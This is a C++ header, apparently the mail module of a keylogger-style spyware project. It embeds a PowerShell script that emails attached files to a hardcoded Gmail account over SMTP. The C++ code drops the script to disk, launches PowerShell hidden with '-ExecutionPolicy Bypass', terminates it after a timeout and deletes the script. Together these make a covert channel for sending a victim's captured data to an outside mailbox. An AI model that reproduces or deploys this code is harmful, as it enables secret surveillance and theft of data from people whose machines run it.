#ifndef MAILSCRIPT_H
#define MAILSCRIPT_H

#include<fstream>
#include<vector>
#include"windows.h"
#include"IO.h"
#include"Timer.h"
#include"Auxiliary.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail
{

#define X_MAIL "email@gmail.com"
#define X_PASSWORD "password"
#define SMTP_SERVER "smtp.gmail.com"
#define SMTP_PORT "587"

    const std::string &PowerShellScript =
"Param \r\n"
"(  \r\n"
"[Parameter(Mandatory=$true)][string]$Subj, \r\n"
"[Parameter(Mandatory=$true)][string]$Body, \r\n"
"[Parameter(Mandatory=$true)][String]$Att \r\n"
") \r\n"
" function Send-Email \r\n"
" { \r\n"
"	Param \r\n"
"	( \r\n"
"	[Parameter(Mandatory=$true)][String]$EmailSubject, \r\n"
"	[Parameter(Mandatory=$true)][String]$EmailBody, \r\n"
"	[Parameter(Mandatory=$true)][String]$EmailAttachment \r\n"
"   ) \r\n"
"    Try \r\n"
"    { \r\n"
"		$EmailFrom = \""+ std::string (X_MAIL) +"\" \r\n"
"		$EmailTo = \""+ std::string (X_MAIL) +"\" \r\n"
"		$SMTPServer = \""+ std::string (SMTP_SERVER) +"\"  \r\n"
"		$SMTPPort = \""+ std::string (SMTP_PORT) +"\"  \r\n"
"		$SMTPAuthPassword =\""+ std::string (X_PASSWORD) +"\" \r\n"
"		$mailmessage = New-Object system.net.mail.mailmessage \r\n"
"		$mailmessage.from = ($EmailFrom) \r\n"
"		$mailmessage.To.add($EmailTo) \r\n"
"		$mailmessage.Subject = $EmailSubject \r\n"
"		$mailmessage.Body = $EmailBody \r\n"
"		$attachment = New-Object System.Net.Mail.Attachment($EmailAttachment, 'text/plain') \r\n"
"		$mailmessage.Attachments.Add($attachment) \r\n"
"		$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, $SMTPPort) \r\n"
"		$SMTPClient.EnableSsl = $true \r\n"
"		$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(\"$EmailFrom\", \"$SMTPAuthPassword\") \r\n"
"		$SMTPClient.Send($mailmessage) \r\n"
"		Remove-Variable -Name EmailFrom \r\n"
"		Remove-Variable -Name EmailTo \r\n"
"		Remove-Variable -Name SMTPServer \r\n"
" 		Remove-Variable -Name SMTPPort \r\n"
"		Remove-Variable -Name SMTPAuthUsername \r\n"
"		Remove-Variable -Name SMTPAuthPassword \r\n"
"		Remove-Variable -Name mailmessage \r\n"
"		Remove-Variable -Name SMTPClient \r\n"
"		exit7; \r\n"
"	} \r\n"
"	catch \r\n"
"	{ \r\n"
"		exit 3; \r\n"
"	} \r\n"
"} \r\n"
"#End Function Send-Email \r\n"
"try \r\n"
"{ \r\n"
"    Send-Email -EmailSubject $Subj -EmailBody $Body -EmailAttachment $Att \r\n"
"} \r\n"
"catch \r\n"
"{ \r\n"
"	exit 4; \r\n"
"} \r\n";

#undef X_MAIL
#undef X_PASSWORD
#undef SMTP_SERVER
#undef SMTP_PORT

    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
            return s;
        size_t sp = 0;

        while((sp =s.find(what, sp)) != std::string::npos)
            s.replace(sp, what.length(), with), sp += with.length();
        return s;
    }

    bool CheckFileExists( const std::string &f)
    {
        std::ifstream file (f);
        return (bool)file;
    }

    bool CreateScript()
    {
        std::ofstream script(IO::GetOurPath(true)+ std::string(SCRIPT_NAME));

        if(!script)
            return false;
        script << PowerShellScript;

        if(!script)
            return false;

        script.close();

        return true;
    }

    void DeleteScript()
    {
        std::string script = IO::GetOurPath(true) + std::string(SCRIPT_NAME);

        remove(script.c_str());
    }

    Timer m_timer;
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        bool ok;

        ok = IO::MKDir(IO::GetOurPath(true));
        if(!ok)
            return -1;
        std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
        if(!CheckFileExists(scr_path))
            ok = CreateScript();
        if(!ok)
        {
            DeleteScript();
            return -2;
        }


        //bypass users previlllages

        std::string param =
        "-ExecutionPolicy Bypass -File \"" +
        scr_path + "\" -Subj \""
        +StringReplace(subject, "\"", "\\\"") +
        "\" -Body \""
        +StringReplace(body, "\"", "\\\"")+
        "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open"; //fix
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_HIDE;
        ShExecInfo.hInstApp = NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok)
        {
        DeleteScript();
            return -3;
        }
        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        m_timer.SetFunction([&]()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            Auxiliary::WriteAppLog("<From SendMail> Return code: " + Auxiliary::ToString((int)exit_code));

        });

        m_timer.RepeatCount(1l);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        DeleteScript();
        return (int)exit_code;


    }
    int SendMail(const std::string &subject, const std::string &body,
                 const std::vector<std::string> &att)
     {
         std::string attachments = "";
         if(att.size()==1U)
            attachments = att.at(0);
         else
         {
             for(const auto &v : att)
                attachments += v + "::";

             attachments = attachments.substr(0, attachments.length() - 2);

         }
         return SendMail(subject, body, attachments);
     }
}
#endif
